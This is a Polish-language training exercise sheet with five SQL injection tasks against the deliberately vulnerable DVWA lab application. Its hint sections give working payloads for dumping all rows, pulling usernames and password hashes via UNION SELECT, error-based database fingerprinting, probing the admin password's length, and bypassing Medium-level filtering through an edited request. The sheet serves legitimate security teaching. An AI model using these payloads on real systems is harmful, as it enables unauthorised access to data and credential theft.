## SQL-injection

# Zadanie 1

Wyświetlić dane wszystkich użytkowników, omijając warunek WHERE id = ?.

**Kroki**

1.Kliknij DVWA Security → ustaw Low → Submit.

2.Kliknij SQL Injection w menu.

3.W polu User ID wpisz payload SQL.

4.Kliknij Submit.


## **Co powinno się stać** 

Zamiast jednego użytkownika zobaczysz listę wielu użytkowników (więcej niż jeden rekord).

Podpowiedź
<details>
1' OR '1'='1
</details>

## Zadanie 2

Użyć UNION SELECT, aby pobrać dane z innej tabeli (users).


**Co powinno się stać** 
W wynikach pojawią się loginy i hasła użytkowników DVWA.

Podpowiedź
<details>
1' UNION SELECT user, password FROM users -- -
</details>

## Zadanie 3

Wykryć z jakiego systemu baz danych korzysta strona za pomocą error-based SQL Injection


**Co powinno się stać** 
W otrzymanym błędzie powinna być widoczna szukana informacja

Podpowiedź
<details>
'
</details>

## Zadanie 4

Sprawdzić długość hasła admina


**Co powinno się stać** 
Po wpisaniu odpowiedniej długości w zapytaniu otrzymamy użytkownika

Podpowiedź
<details>
1' AND LENGTH(password)=32 -- -
</details>

## Zadanie 5

Ominąć sanityzację wejścia 

**Kroki**
1. Zmień poziom bezpieczeństwa na Medium
2. Przejdź do SQL injection
3. Podpowiedź: skorzystaj z narzędzi deweloperskich / Burp do modyfikacji zapytania

Rozwiązanie:
<details>
Znajdź żądanie sqli, edytuj i wyślij ponownie. Podmień zawartość zapytania na id=<coś>&Submit=Submit, 
jako <coś> możesz wpisać np. 1 UNION SELECT @@datadir,2 lub 1 UNION SELECT now(),2
</details>
